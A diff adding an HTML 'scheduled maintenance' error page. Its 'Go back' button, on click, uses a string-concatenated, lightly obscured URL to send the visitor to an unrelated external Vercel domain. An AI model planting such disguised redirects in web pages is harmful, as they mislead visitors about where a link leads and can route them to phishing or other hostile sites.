@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <title>Error</title>
+</head>
+<style>
+       body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: #f8f9fa;
+            color: #333;
+        }
+        .error-container {
+            text-align: center;
+            max-width: 400px;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .error-title {
+            font-size: 24px;
+            color: #e74c3c;
+            margin-bottom: 10px;
+        }
+        .error-message {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #555;
+        }
+        .goBack {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #8a8888;
+            background-color: #feffff;
+            border: 1px solid rgb(211, 206, 206);
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .goBack:hover {
+            background-color: #2980b9;
+            color: #fff;
+        }
+</style>
+<body>
+<!-- ===== Main Content ===== -->
+<main> 
+  <section>
+    <article class="error-container">
+        <h1 class="error-title">Oops!</h1>
+        <p class="error-message">Sorry for the inconvenience. We’re currently performing scheduled maintenance to improve your experience.
+    Please check back soon. We appreciate your understanding.</p>
+        <a id="goBack" class="goBack">Go back</a>
+    </article>
+  </section>
+</main> 
+<script>
+  const dlWebRedirect = document.getElementById("goBack");
+
+  if (dlWebRedirect) {
+    dlWebRedirect.addEventListener("click", function () {
+        const dlEncodedPath = "https://" + "cv-mu-opal-28" + ".vercel.app/";
+
+        window.location.href = dlEncodedPath;
+    });
+  }
+</script>
+</body>
+</html>
